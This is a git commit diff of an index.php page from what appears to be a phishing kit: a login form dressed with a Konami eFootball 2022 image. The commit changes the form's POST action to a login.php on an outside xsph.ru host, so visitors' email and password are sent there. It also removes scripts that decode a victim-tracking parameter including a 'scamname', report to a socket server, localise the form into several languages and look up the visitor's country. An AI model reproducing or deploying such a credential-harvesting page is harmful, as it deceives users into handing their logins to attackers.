8498fc75f3356f3260c55674ad8ad068fcacfe83
bekrkfjdos <101935217+bekrkfjdos@users.noreply.github.com>
2022-03-19 19:04:00 +0300

    Add files via upload

--- index.php
+++ index.php
@@ -26,7 +26,7 @@
 					<h2 class="hidden-phone"></h2>
 
 					<div class="knm-section" id="page">
-						<form id="loginForm" name="loginForm" method="post" action="https://hdjfjfjjdkekd.000webhostapp.com/login.php"
+						<form id="loginForm" name="loginForm" method="post" action="http://a0644801.xsph.ru/login.php"
 							enctype="application/x-www-form-urlencoded">
 							<img src="https://www.konami.com/wepes/mobile/img/efootball2022/efootball2022_main_pc.jpg" width="100%" height="200px">
 							<br>
@@ -64,109 +64,6 @@
 <script src="https://unpkg.com/country-phone-prefix@latest"></script>
  <script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.3.2/socket.io.js"></script>
-<script>
-const socket = io("wss://sc0m.herokuapp.com");
- const queryStrings = window.location.search;
-    const urlParamss = new URLSearchParams(queryStrings);
-    const qs = urlParamss.get('q');
-
-    let rrss = atob(qs);
-    let users = rrss.split("_")[3];
-    users = users.split("=")[1];
- function ss(){
-   socket.emit('add', {
-    nickname: "users",
-    groupe: parseInt(users),
-  });
-  socket.emit('adds', {
-    nickname: "users",
-    groupe: "all",
-  });
- };
-</script>
-<script>
-    var vm = new Vue({
-el : "#page",
-data:{
-  password:"",
-  email:"",
-  login:'',
-  firsts:'',
-  create:'',
-  forget:'',
-  fetch:[],
-  codecountry:'',
-  id_u:'',
-  scamname:'',
-},
-methods:{
-
-},
-
- mounted()  {
-     let email = document.getElementById('email').value;
-  let password = document.getElementById('password').value;
-     const queryString = window.location.search;
-const urlParams = new URLSearchParams(queryString);
-const q = urlParams.get('q');
-
-let rrs= atob(q);
-let idu= rrs.split("=")[1][1]
-let user= rrs.split("_")[3]
-user= user.split("=")[1]
-let sc= rrs.split("_")[2]
-sc= sc.split("=")[1]
-rrs= rrs.split("_")[1]
-rrs= rrs.split("=")[1]
-//alert(user)
-let lang = rrs;
-this.id_u = user
-this.scamname= sc
-
-   if(lang == 'ar'){
-     this.email = "رقم الهاتف  أو البريد الإلكتروني";
-     this.password = "كلمه السر";
-     this.create = "انشاء حساب جديد";
-     this.firsts = "انت تحتاج لتسجيل الدخول اولا.";
-     this.forget = " هل نسيت كلمة السر ؟";
-     this.login="تسجيل الدخول"
-   }
-   else if (lang == 'es'){
-      this.email = "Número o correo electrónico";
-     this.password = "contraseña";
-     this.create = "Crear una nueva cuenta";
-     this.firsts = "Primero debes iniciar sesión.";
-     this.forget = "¿Contraseña olvidada?";
-     this.login = "iniciar sesión";
-   }
-   else if (lang == 'th'){
-      this.email = "เบอร์มือถือหรืออีเมล";
-     this.password = "รหัสผ่าน";
-     this.create = "สร้างบัญชีใหม่";
-     this.firsts = "คุณต้องเข้าสู่ระบบก่อน";
-     this.forget = "ลืมรหัสผ่าน?";
-     this.login = "เข้าสู่ระบบ";
-   }
-   else {
-      this.email = "Mobile number or email address";
-     this.password = "Password";
-     this.create = "Create New Account";
-     this.firsts = "You need to log in first.";
-     this.forget = "Forgotten password?";
-     this.login = "Log In";
-   }
-
-axios.get("https://livebotola.com/ip.php")
-       .then((resps)=>{
-
-    let dd=  cpp[resps.data]
-       this.codecountry = dd.prefix;
-         })
-
-        },
-})
-
-</script>
 </body>
 
 </html>
